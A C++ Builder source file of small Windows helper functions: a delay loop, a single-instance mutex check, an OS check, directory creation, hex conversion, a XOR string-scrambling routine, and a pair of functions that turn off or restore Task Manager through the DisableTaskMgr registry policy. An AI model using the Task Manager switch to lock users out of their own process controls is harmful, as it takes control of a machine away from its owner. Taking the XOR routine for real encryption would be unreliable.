//---------------------------------------------------------------------------
#include <vcl.h>
#include <Registry.hpp>
#pragma hdrstop
#pragma warn -aus

#include "MyApiUnit.h"
//---------------------------------------------------------------------------
#pragma package(smart_init)
//---------------------------------------------------------------------------
void MyDelay(DWORD msec)
{
   DWORD start = 0, finish = 0, test = 0;
   start = GetTickCount();
   for(;;)
   {
      test = GetTickCount();
      finish = test - start;
      if( finish > msec ) break;
   }
}
//---------------------------------------------------------------------------
BOOL WeAreAlone (LPSTR szName)
{
   HANDLE hMutex = CreateMutex (NULL, TRUE, szName);
   if (GetLastError() == ERROR_ALREADY_EXISTS)
   {
      CloseHandle(hMutex);
      return FALSE;
   }
   return TRUE;
}
bool OsTypeNT()
{
        OSVERSIONINFO vi;

        vi.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
        GetVersionEx(&vi);
        if (vi.dwPlatformId==VER_PLATFORM_WIN32_NT)
        return true;

        return false;
}
//---------------------------------------------------------------------------
bool SetCatalog( AnsiString path )
{
   bool flag = false;

   if ( !DirectoryExists(path) )
   {
      if ( CreateDir(path) ) flag = true;
   }
   else flag = true;

   return flag;
}
//---------------------------------------------------------------------------
int Char2Hex( char ch )
{
   int rez = 0;
   switch( ch )
   {
      case '0': rez = 0;
                break;
      case '1': rez = 1;
                break;
      case '2': rez = 2;
                break;
      case '3': rez = 3;
                break;
      case '4': rez = 4;
                break;
      case '5': rez = 5;
                break;
      case '6': rez = 6;
                break;
      case '7': rez = 7;
                break;
      case '8': rez = 8;
                break;
      case '9': rez = 9;
                break;
      case 'A': rez = 10;
                break;
      case 'B': rez = 11;
                break;
      case 'C': rez = 12;
                break;
      case 'D': rez = 13;
                break;
      case 'E': rez = 14;
                break;
      case 'F': rez = 15;
                break;
      case 'a': rez = 10;
                break;
      case 'b': rez = 11;
                break;
      case 'c': rez = 12;
                break;
      case 'd': rez = 13;
                break;
      case 'e': rez = 14;
                break;
      case 'f': rez = 15;
                break;
   }
   return rez;
}
//---------------------------------------------------------------------------
void TaskManagerOn()
{
  AnsiString S;
  TRegistry *Registry = new TRegistry();
  try
  {
    Registry->RootKey = HKEY_CURRENT_USER;
    Registry->OpenKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",true);
    Registry->WriteInteger("DisableTaskMgr", 0);
  }
  __finally
  {
    delete Registry;
  }
}
//---------------------------------------------------------------------------
void TaskManagerOff()
{
  AnsiString S;
  TRegistry *Registry = new TRegistry();
  try
  {
    Registry->RootKey = HKEY_CURRENT_USER;
    Registry->OpenKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",true);
    Registry->WriteInteger("DisableTaskMgr", 1);
  }
  __finally
  {
    delete Registry;
  }
}
//---------------------------------------------------------------------------
AnsiString XOR_Crypt(AnsiString in, AnsiString pass)
{
   AnsiString out;
   for (int x=1;x<in.Length()+1;x++)
   {
      out += (char)(in[x] ^ pass[x%pass.Length()+1] * 2);  /// ??????? * 2 ? ????? ?????????? ?????????
   }
   return out;
}
//---------------------------------------------------------------------------

